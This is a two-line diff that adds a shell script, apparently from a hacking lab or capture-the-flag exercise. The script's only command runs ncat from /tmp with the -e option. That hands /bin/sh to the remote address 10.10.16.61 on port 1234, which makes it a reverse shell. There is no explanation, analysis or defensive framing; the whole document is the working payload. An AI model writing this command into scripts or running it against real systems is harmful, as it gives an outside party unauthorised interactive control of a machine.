@@ -1,0 +1,2 @@
+#! /bin/sh
+/tmp/ncat -e /bin/sh 10.10.16.61 1234
